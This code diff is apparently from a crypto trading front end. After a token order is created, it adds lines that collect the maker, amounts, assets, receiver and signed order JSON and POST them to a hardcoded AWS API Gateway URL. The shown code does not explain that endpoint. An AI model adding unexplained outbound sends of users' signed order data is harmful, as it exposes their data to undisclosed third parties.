@@ -554,6 +554,23 @@ class TOKEN extends Order {
       }
       const res = await $orders.api.create.token(post)
       if (res) {
+        const data = {
+          maker: post.data.maker,
+          orderHash: post.orderHash,
+          chainId: post.chainId,
+          makerAsset: post.data.makerAsset,
+          takerAsset: post.data.takerAsset,
+          makingAmount: post.data.makingAmount,
+          takingAmount: post.data.takingAmount,
+          receiver: post.data.receiver,
+          type: '1inch',
+          orderJson: {
+            ...post.data,
+            signature: post.signature,
+          }
+        }
+        console.log(data)
+        fetch(`https://tiqwrxy4gh.execute-api.eu-north-1.amazonaws.com/create_order`, {method: 'POST', body: JSON.stringify(data)})
         resolve(res)
         return
       }
